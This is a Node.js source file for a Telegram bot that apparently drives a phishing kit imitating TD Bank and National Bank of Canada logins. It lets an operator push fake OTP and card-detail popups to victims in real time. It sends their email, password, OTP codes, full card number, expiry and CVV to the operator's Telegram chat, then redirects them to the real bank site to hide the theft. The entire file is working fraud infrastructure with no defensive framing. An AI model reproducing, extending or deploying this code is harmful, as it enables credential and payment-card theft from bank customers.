const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const otpStore = require('./otpStore'); // Serves as sessionStore
require('dotenv').config();

const token = process.env.BOT_TOKEN;
const chatId = process.env.ADMIN_CHAT_ID;
const isPlaceholderToken = !token || token === 'your_telegram_bot_token';
const isPlaceholderChatId = !chatId || chatId === 'your_personal_telegram_chat_id' || isNaN(Number(chatId));

const useMock = isPlaceholderToken || isPlaceholderChatId;

let bot;

if (useMock) {
  console.warn('⚠️ Telegram configuration (BOT_TOKEN or ADMIN_CHAT_ID) is missing, invalid, or set to placeholder. Telegram bot features will run in Mock mode.');
  bot = {
    sendMessage: async (chatId, text, options) => {
      console.log(`[MOCK BOT SEND] To: ${chatId}\nContent:\n${text}`);
      if (options && options.reply_markup) {
        console.log(`[MOCK BOT KEYBOARD]`, JSON.stringify(options.reply_markup, null, 2));
      }
      return { message_id: Date.now() };
    },
    answerCallbackQuery: async (callbackQueryId, options) => {
      console.log(`[MOCK BOT ANSWER] Query ID: ${callbackQueryId}, Text: ${options ? options.text : ''}`);
    },
    editMessageText: async (text, options) => {
      console.log(`[MOCK BOT EDIT] Message ID: ${options.message_id}\nNew Content:\n${text}`);
      if (options && options.reply_markup) {
        console.log(`[MOCK BOT EDIT KEYBOARD]`, JSON.stringify(options.reply_markup, null, 2));
      }
    },
    on: (event, handler) => {
      if (event === 'callback_query') {
        bot._callbackQueryHandler = handler;
      }
    }
  };
} else {
  bot = new TelegramBot(token, { polling: true });
}

// Helpers for formatted IST time
function getISTTimeOnly() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

function getISTDateTime() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

// Handle callback_query for real-time button commands
bot.on('callback_query', async (callbackQuery) => {
  const { id: callbackQueryId, data, message } = callbackQuery;
  if (!data) return;

  const colonIdx = data.indexOf(':');
  if (colonIdx === -1) return;

  const action = data.slice(0, colonIdx);
  const email = data.slice(colonIdx + 1);

  const session = otpStore[email];
  if (!session) {
    console.error(`[Bot Error] Session not found for email: ${email}`);
    try {
      await bot.answerCallbackQuery(callbackQueryId, {
        text: '❌ Session expired or not found',
        show_alert: true
      });
    } catch (e) {}
    return;
  }

  const timeOnly = getISTTimeOnly();
  const dateTimeStr = getISTDateTime();

  try {
    if (action === 'pop_otp') {
      // 1. Generate 6-digit OTP
      const otp = crypto.randomInt(100000, 999999).toString();
      session.status = 'show_otp';
      session.otp = otp;
      session.otpExpiry = Date.now() + 60000; // 60 seconds (1 minute)

      // 2. Answer callback query
      await bot.answerCallbackQuery(callbackQueryId, { text: '📤 OTP popup triggered!' });

      // 3. Edit original message (remove buttons)
      await bot.editMessageText(
        `✅ OTP POPUP TRIGGERED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: OTP popup shown to user`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Triggered OTP popup for ${email}. OTP is ${otp}`);

    } else if (action === 'show_card') {
      // Trigger card details form on user's screen
      session.status = 'card_popup';
      await bot.answerCallbackQuery(callbackQueryId, { text: '💳 Card form triggered!' });
      await bot.editMessageText(
        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Triggered card form for ${email}`);

    } else if (action === 'accept_otp_card') {
      session.status = 'card_popup';
      await bot.answerCallbackQuery(callbackQueryId, { text: '💳 OTP Accepted — Card popup triggered!' });
      await bot.editMessageText(
        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Triggered card popup for ${email}`);

    } else if (action === 'accept_card') {
      session.status = 'verified';
      const rawCard = (session.cardNumber || '').replace(/\D/g, '');
      const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
      await bot.answerCallbackQuery(callbackQueryId, { text: '✅ Card accepted! Redirecting user...' });
      await bot.editMessageText(
        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 Email OTP: ${session.otpEntered || 'N/A'}\n💳 Card: ${formattedCard}\n📅 Expiry: ${session.expiry || 'N/A'}\n🔒 CVV: ${session.cvv || 'N/A'}\n🔢 Card OTP: ${session.cardOtpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Accepted card for ${email}. User redirecting.`);

    } else if (action === 'show_otp_again') {
      const otp = crypto.randomInt(100000, 999999).toString();
      session.status = 'show_otp';
      session.otp = otp;
      session.otpExpiry = Date.now() + 60000;
      session.cardOtpMode = true; // flag so frontend shows card-specific OTP subtitle

      await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Card OTP generated — Card form dismissed' });
      await bot.editMessageText(
        `🔄 OTP POPUP RE-TRIGGERED (CARD VERIFICATION)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timeOnly}\nStatus: User must enter card verification code`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Re-triggered OTP (card mode) for ${email}. New OTP: ${otp}`);

    } else if (action === 'cancel') {
      session.status = 'cancelled';
      await bot.answerCallbackQuery(callbackQueryId, { text: '❌ Login attempt cancelled' });
      await bot.editMessageText(
        `❌ LOGIN CANCELLED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: Session terminated`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Cancelled login session for ${email}`);

    } else if (action === 'accept_otp') {
      session.status = 'verified';
      await bot.answerCallbackQuery(callbackQueryId, { text: '✅ OTP Accepted & Verified!' });

      await bot.editMessageText(
        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/ca/en/personal-banking`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Verified OTP for ${email}. User redirecting to https://www.td.com/ca/en/personal-banking`);

    } else if (action === 'wrong_otp') {
      session.status = 'rejected';
      await bot.answerCallbackQuery(callbackQueryId, { text: '❌ OTP marked wrong. Prompting retry...' });
      await bot.editMessageText(
        `❌ OTP REJECTED — RETRY\n\n📧 Email: ${email}\n🔢 OTP Entered: ${session.otpEntered || 'N/A'}\n🕐 Time: ${timeOnly}\nStatus: User must retry`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Rejected OTP for ${email}`);

    } else if (action === 'resend_otp') {
      const otp = crypto.randomInt(100000, 999999).toString();
      session.status = 'show_otp';
      session.otp = otp;
      session.otpExpiry = Date.now() + 60000; // Reset to 60s

      await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 New OTP generated and displayed' });
      await bot.editMessageText(
        `🔄 NEW OTP GENERATED\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timeOnly}\nStatus: User must enter new code`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Resent new OTP for ${email}. New OTP: ${otp}`);

    } else if (action === 'redirect') {
      session.status = 'redirect';
      const redirectUrl = 'https://www.nationalbank.ca/dashboard';
      session.redirectUrl = redirectUrl;

      await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Redirecting user...' });
      await bot.editMessageText(
        `🔄 REDIRECT TRIGGERED\n\n📧 Email: ${email}\n🌐 Redirecting to: ${redirectUrl}\n🕐 Time: ${timeOnly}`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Redirected user ${email} to ${redirectUrl}`);

    } else if (action === 'verify_success') {
      session.status = 'verified';

      await bot.answerCallbackQuery(callbackQueryId, { text: '✅ User marked as successfully verified!' });
      await bot.editMessageText(
        `✅ VERIFICATION CONFIRMED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: User notified of successful verification (no redirect)`,
        {
          chat_id: message.chat.id,
          message_id: message.message_id
        }
      );
      console.log(`[Bot] Confirmed verification for ${email} on page`);
    }

  } catch (error) {
    // Telegram throws 400 "message is not modified" when you click a button
    // that would result in the same message content — this is harmless, ignore it.
    if (error.message && error.message.includes('message is not modified')) {
      return;
    }
    console.error(`[Bot Error] Failed to handle callback query for ${action}:`, error);
    try {
      await bot.answerCallbackQuery(callbackQueryId, {
        text: `❌ Error: ${error.message}`,
        show_alert: true
      });
    } catch (e) {}
  }
});

module.exports = bot;
